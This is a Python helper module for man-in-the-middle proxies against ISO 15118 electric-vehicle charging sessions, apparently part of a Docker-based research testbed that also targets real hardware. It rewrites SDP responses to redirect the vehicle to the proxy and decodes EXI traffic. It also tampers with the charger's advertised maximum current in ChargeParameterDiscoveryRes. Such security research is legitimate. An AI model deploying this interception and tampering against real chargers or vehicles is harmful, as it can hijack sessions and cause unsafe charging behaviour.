"""
Shared helpers for the HLC MITM proxies (proxy01.py, evil_secc.py, evil_evcc.py).

Extracted from proxy01.py so the single-relay proxy and the split
Evil_SECC/Evil_EVCC pair can't drift apart on decode/tamper/framing logic --
one implementation, imported by all three entry points.
"""

import asyncio
import ipaddress
import json
import re
import struct

from iso15118.shared.exificient_exi_codec import ExificientEXICodec as _RealExificientEXICodec
from iso15118.shared.messages.enums import Namespace, Protocol

# --------------------------------------------------------------------
# SECC/EVCC network identity (subnet-based, not interface-list-order-based)
# --------------------------------------------------------------------
# These are the subnets proxy_net1 (SECC-facing) and proxy_net2 (EVCC-facing)
# are created with. Docker does not guarantee that eth0/eth1 map to
# proxy_net1/proxy_net2 in a stable order across container restarts or
# `docker network connect` calls, so we identify each interface by which of
# these subnets it's actually on, instead of assuming a fixed interface order.
SECC_NET_V4 = ipaddress.ip_network("172.20.0.0/16")
SECC_NET_V6 = ipaddress.ip_network("2001:db8:1::/64")
EVCC_NET_V4 = ipaddress.ip_network("172.19.0.0/16")
EVCC_NET_V6 = ipaddress.ip_network("2001:db8:2::/64")

iface_header_pattern = re.compile(r'^(\d+):\s+(\S+?)(?:@\S+)?:')
inet4_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)/\d+')
inet6_global_pattern = re.compile(r'inet6 ([\da-fA-F:]+)/\d+ scope global')
inet6_link_pattern = re.compile(r'inet6 ([\da-fA-F:]+)/\d+ scope link')

# --------------------------------------------------------------------
# EXI namespaces tried by decode_with_fallback(), in order.
# --------------------------------------------------------------------
# SupportedAppProtocolReq/Res uses the SAP namespace; everything else in an
# ISO 15118-2 session uses ISO_V2_MSG_DEF. ISO 15118-20 splits its message
# set across several namespaces instead of one (Common/AC/DC/WPT/ACDP) --
# Protocol.v20_namespaces() enumerates all of them, so a -20 session's
# messages get decoded the same way a -2 session's do, just trying more
# candidates per message.
APP_PROTOCOL_NS = Namespace.SAP.value
MSG_DEF_NS = Namespace.ISO_V2_MSG_DEF.value


def _candidate_namespaces():
    namespaces = [APP_PROTOCOL_NS, MSG_DEF_NS]
    try:
        namespaces.extend(Protocol.v20_namespaces())
    except Exception:
        # Falls back to -2-only decoding if this pinned stack version's
        # Protocol enum doesn't expose v20_namespaces() -- decode just
        # won't succeed for -20 messages, same as before this was added.
        pass
    return namespaces


# --------------------------------------------------------------------
# EXI Codec Wrapper
# --------------------------------------------------------------------
# The original hand-rolled version of this class here only implemented
# decode() (not encode()/get_version()), which IEXICodec's ABC requires --
# so `ExificientEXICodec()` raised `TypeError: Can't instantiate abstract
# class ... with abstract methods encode, get_version` the moment --debug
# was used, silently killing every session it was tried on. Fixed by
# reusing the real, complete codec the SECC/EVCC processes themselves use
# (iso15118.shared.exificient_exi_codec.ExificientEXICodec) instead of a
# partial reimplementation -- this also guarantees encode()'s output stays
# schema-compatible with whatever this iso15118 version actually expects,
# which a hand-rolled encoder would risk getting subtly wrong.
class ProxyCodec:
    _shared = None

    def __init__(self):
        if ProxyCodec._shared is None:
            ProxyCodec._shared = _RealExificientEXICodec()
        self._codec = ProxyCodec._shared

    async def decode(self, stream: bytes, namespace: str) -> str:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self._codec.decode, stream, namespace)

    async def encode(self, message: str, namespace: str) -> bytes:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self._codec.encode, message, namespace)


async def decode_with_fallback(codec, payload: bytes):
    """
    Try decoding a V2GTP payload against each known namespace in turn (see
    _candidate_namespaces() -- SAP, ISO 15118-2, then every ISO 15118-20
    message-family namespace). Returns (decoded_dict, namespace) or
    (None, None) if nothing matched.
    """
    for ns in _candidate_namespaces():
        try:
            decoded = await codec.decode(payload, ns)
            return json.loads(decoded), ns
        except Exception:
            continue
    return None, None

# --------------------------------------------------------------------
# Interface discovery
# --------------------------------------------------------------------
async def discover_secc_evcc_interfaces(secc_iface=None, evcc_iface=None,
                                         secc_net_v4=None, secc_net_v6=None,
                                         evcc_net_v4=None, evcc_net_v6=None):
    """
    Identify which local interface faces SECC's network (proxy_net1) and
    which faces EVCC's (proxy_net2).

    Default (secc_iface/evcc_iface both None): match each interface's
    actual assigned subnet (IPv4 and/or global IPv6) against the known
    SECC_NET_*/EVCC_NET_* ranges (or secc_net_v4/v6, evcc_net_v4/v6, if
    given -- see below). This is self-correcting regardless of which order
    the interfaces were connected in -- it does not rely on `ip a` listing
    order at all.

    secc_net_v4/secc_net_v6/evcc_net_v4/evcc_net_v6: override which
    ip_network ranges count as "secc"/"evcc" instead of the module-level
    SECC_NET_*/EVCC_NET_* constants (proxy_net1/proxy_net2's subnets).
    Needed when a caller sits on a different pair of networks entirely --
    e.g. the EVExchange cross-relay's Dev2 (proxy/dev_relay.py), which
    faces proxy_net3/proxy_net4, not proxy_net1/proxy_net2. Defaults
    (None) keep today's behavior unchanged for proxy01.py/evil_secc.py/
    evil_evcc.py, none of which pass these.

    If secc_iface/evcc_iface are given (--secc-iface/--evcc-iface on the
    CLI), match by interface name instead -- for real hardware, where the
    physical NICs won't be on proxy_net1's/proxy_net2's specific Docker
    subnets, so the caller names them explicitly (e.g. "eth0"/"eth1").

    Returns {"secc": (link_local_addr, scope_id), "evcc": (link_local_addr, scope_id)},
    with a role missing if no interface matched.
    """
    secc_net_v4 = secc_net_v4 or SECC_NET_V4
    secc_net_v6 = secc_net_v6 or SECC_NET_V6
    evcc_net_v4 = evcc_net_v4 or EVCC_NET_V4
    evcc_net_v6 = evcc_net_v6 or EVCC_NET_V6
    result = await asyncio.create_subprocess_shell('ip a', stdout=asyncio.subprocess.PIPE)
    stdout, _ = await result.communicate()
    lines = stdout.decode().splitlines()

    interfaces = {}  # scope_id -> {"name": str, "v4": str, "v6_global": str, "v6_link": str}
    current_scope_id = None
    for line in lines:
        header_match = iface_header_pattern.match(line)
        if header_match:
            current_scope_id = int(header_match.group(1))
            interfaces[current_scope_id] = {"name": header_match.group(2)}
            continue
        if current_scope_id is None:
            continue
        v4_match = inet4_pattern.search(line)
        if v4_match:
            interfaces[current_scope_id]["v4"] = v4_match.group(1)
        v6_global_match = inet6_global_pattern.search(line)
        if v6_global_match:
            interfaces[current_scope_id]["v6_global"] = v6_global_match.group(1)
        v6_link_match = inet6_link_pattern.search(line)
        if v6_link_match:
            interfaces[current_scope_id]["v6_link"] = v6_link_match.group(1)

    if secc_iface or evcc_iface:
        by_name = {addrs["name"]: (scope_id, addrs) for scope_id, addrs in interfaces.items()}
        roles = {}
        for role, wanted_name in (("secc", secc_iface), ("evcc", evcc_iface)):
            if not wanted_name:
                continue
            if wanted_name not in by_name:
                print(f"WARNING: --{role}-iface {wanted_name} not found in `ip a` output")
                continue
            scope_id, addrs = by_name[wanted_name]
            link = addrs.get("v6_link")
            if not link:
                print(f"WARNING: {wanted_name} (--{role}-iface) has no link-local IPv6 "
                      f"address -- is the interface up?")
                continue
            roles[role] = (link, scope_id)
        return roles

    def identify_role_by_subnet(addrs):
        v4 = addrs.get("v4")
        v6g = addrs.get("v6_global")
        try:
            if v4 and ipaddress.ip_address(v4) in secc_net_v4:
                return "secc"
            if v4 and ipaddress.ip_address(v4) in evcc_net_v4:
                return "evcc"
            if v6g and ipaddress.ip_address(v6g) in secc_net_v6:
                return "secc"
            if v6g and ipaddress.ip_address(v6g) in evcc_net_v6:
                return "evcc"
        except ValueError:
            pass
        return None

    roles = {}
    for scope_id, addrs in interfaces.items():
        link = addrs.get("v6_link")
        if not link:
            continue
        role = identify_role_by_subnet(addrs)
        if role:
            roles[role] = (link, scope_id)

    return roles

# --------------------------------------------------------------------
# SDP response parsing/rewriting (proxy01.py's single-relay path, which
# rewrites a real SDP response rather than constructing its own)
# --------------------------------------------------------------------
def parse_response(hex_data):
    data = bytes.fromhex(hex_data)
    return {
        'Version': data[0],
        'Message Type': data[1],
        'Message Length': int.from_bytes(data[2:4], 'big'),
        'Reserved': int.from_bytes(data[4:8], 'big'),
        'SECC IP Address': str(ipaddress.IPv6Address(data[8:24])),
        'SECC Port': int.from_bytes(data[24:26], 'big'),
        'Security': data[26],
        'Transport Protocol': data[27],
    }

def create_new_response_message(original_message, new_ip, new_port):
    new_ip_bytes = ipaddress.IPv6Address(new_ip).packed
    new_port_bytes = new_port.to_bytes(2, 'big')
    return original_message[:8] + new_ip_bytes + new_port_bytes + original_message[26:]

# --------------------------------------------------------------------
# V2GTP framing
# --------------------------------------------------------------------
async def read_v2gtp_message(reader):
    """
    Read exactly one V2GTP message: an 8-byte header (1B version, 1B
    inverse version, 2B payload type, 4B payload length) followed by
    exactly that many payload bytes. Version-agnostic -- identical framing
    for ISO 15118-2 and -20. Used for every plaintext message, not just the
    first, so SECC/EVCC always receive one complete message per write, and
    so tampering has reliable message boundaries to work with.
    Raises asyncio.IncompleteReadError on a clean EOF.
    """
    header = await reader.readexactly(8)
    payload_length = int.from_bytes(header[4:8], "big")
    payload = await reader.readexactly(payload_length)
    return header, payload

def tamper_charge_parameter_discovery_res(decoded, new_current_a):
    """
    If `decoded` is an ISO 15118-2 ChargeParameterDiscoveryRes, bump
    AC_EVSEChargeParameter.EVSEMaxCurrent.Value to new_current_a in place
    and return the original value. Returns None (no change made) if this
    isn't that message, or if the expected AC field path isn't present
    (e.g. a DC session, or an ISO 15118-20 session, which uses a
    differently-shaped ACChargeParameterDiscoveryRes/
    DCChargeParameterDiscoveryRes instead -- left alone rather than
    guessing at a -20-specific field to tamper).

    new_current_a is passed in by the caller (each entry point reads its
    own --tamper/TAMPER_CURRENT_A CLI/env setting) rather than read as a
    module-level global here, so this function has no hidden state.
    """
    try:
        charge_param_res = decoded["V2G_Message"]["Body"]["ChargeParameterDiscoveryRes"]
        max_current = charge_param_res["AC_EVSEChargeParameter"]["EVSEMaxCurrent"]
    except (KeyError, TypeError):
        return None
    original_value = max_current["Value"]
    max_current["Value"] = new_current_a
    return original_value

# --------------------------------------------------------------------
# Length-prefixed JSON framing for the Evil_SECC <-> Evil_EVCC bridge_net
# control/data channel.
# --------------------------------------------------------------------
async def write_json_frame(writer, obj):
    data = json.dumps(obj).encode()
    writer.write(struct.pack(">I", len(data)) + data)
    await writer.drain()

async def read_json_frame(reader):
    """Raises asyncio.IncompleteReadError on a clean EOF."""
    length_bytes = await reader.readexactly(4)
    length = struct.unpack(">I", length_bytes)[0]
    data = await reader.readexactly(length)
    return json.loads(data.decode())
